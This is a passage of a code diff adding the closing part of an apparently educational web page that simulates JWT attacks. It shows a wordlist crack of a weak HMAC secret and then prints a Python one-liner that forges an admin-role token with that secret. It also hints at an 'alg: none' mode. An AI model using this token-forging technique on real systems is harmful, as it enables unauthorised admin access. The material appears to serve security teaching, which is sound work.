+        clearInterval(crackInterval);
+        res.style.display='block';
+        res.className='result-box r-green';
+        res.innerHTML=`<strong>Secret cracked: "secret123"</strong><br>Now sign any payload with this secret to forge valid tokens:<br><code style="font-family:'Courier New',monospace;font-size:11px">python3 -c "import jwt; print(jwt.encode({'sub':'1001','role':'admin'}, 'secret123', algorithm='HS256'))"</code>`;
+      }
+      i++;
+    } else {
+      clearInterval(crackInterval);
+      prog.innerHTML+='[DONE] Secret not in wordlist. Try rockyou.txt or rules-based attack.\n';
+    }
+  },120);
+}
+
+// Init
+decodeJWT();
+setAttack('none');
+</script>
+</body>
+</html>
